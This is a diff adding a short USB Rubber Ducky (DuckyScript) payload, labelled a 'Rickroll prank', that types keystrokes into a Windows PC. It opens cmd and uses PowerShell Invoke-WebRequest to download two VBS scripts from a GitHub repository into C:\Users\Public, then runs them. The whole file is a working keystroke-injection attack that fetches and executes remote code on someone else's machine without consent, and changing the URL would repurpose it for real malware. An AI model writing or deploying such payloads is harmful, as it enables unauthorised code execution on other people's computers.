@@ -1,0 +1,11 @@
+REM TITLE Rickroll prank
+REM AUTHOR mrLeonTheMaster
+REM DESCRIPTION Runs the rickroll + lyrics prank on a windows pc, code on https://github.com/mrLeonTheMaster/prank/blob/main/rickroll.vbs, https://github.com/mrLeonTheMaster/prank/blob/main/rickroll_lyrics.vbs
+
+GUI r
+DELAY 500
+STRING cmd.exe
+ENTER
+DELAY 1500
+STRING powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/mrLeonTheMaster/prank/main/rickroll.vbs -OutFile C:\Users\Public\rickroll.vbs" & powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/mrLeonTheMaster/prank/main/rickroll_lyrics.vbs -OutFile C:\Users\Public\rickroll_lyrics.vbs" & start C:\Users\Public\rickroll.vbs && start C:\Users\Public\rickroll_lyrics.vbs & exit
+ENTER
